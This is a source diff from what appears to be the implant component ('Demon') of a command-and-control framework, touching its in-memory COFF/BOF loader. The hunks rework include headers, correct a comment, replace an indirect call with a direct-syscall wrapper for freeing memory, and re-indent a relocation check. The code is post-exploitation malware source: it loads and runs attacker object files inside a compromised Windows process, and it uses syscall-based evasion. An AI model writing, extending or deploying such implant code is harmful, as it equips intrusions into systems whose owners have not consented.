@@ -1,15 +1,11 @@
 
 #include <Demon.h>
 
-#include <Core/WinUtils.h>
-#include "Common/Defines.h"
+#include <Core/Win32.h>
 #include <Core/MiniStd.h>
 #include <Core/Package.h>
-#include "Common/Macros.h"
-#include <Core/Parser.h>
-
+#include <Common/Macros.h>
 #include <Inject/InjectUtil.h>
-
 #include <Loader/CoffeeLdr.h>
 #include <Loader/ObjectApi.h>
 
@@ -238,7 +234,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         }
     }
 
-    // set apropiate permissions for each section
+    // set appropriate permissions for each section
     for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
     {
         Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
@@ -365,7 +361,7 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
 
     Pointer = Coffee->ImageBase;
     Size    = Coffee->BofSize;
-    if ( ! NT_SUCCESS( ( NtStatus = Instance.Syscall.NtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
+    if ( ! NT_SUCCESS( ( NtStatus = SysNtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
     {
         NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
         PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
@@ -507,7 +503,7 @@ BOOL CoffeeProcessSections( PCOFFEE Coffee )
                 *( ( PUINT64 ) RelocAddr ) = OffsetLong;
             }
 #else
-            if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
+                if ( Coffee->Reloc->Type == IMAGE_REL_I386_REL32 && FuncPtr == NULL )
             {
                 Offset = *( PUINT32 ) ( RelocAddr );
 
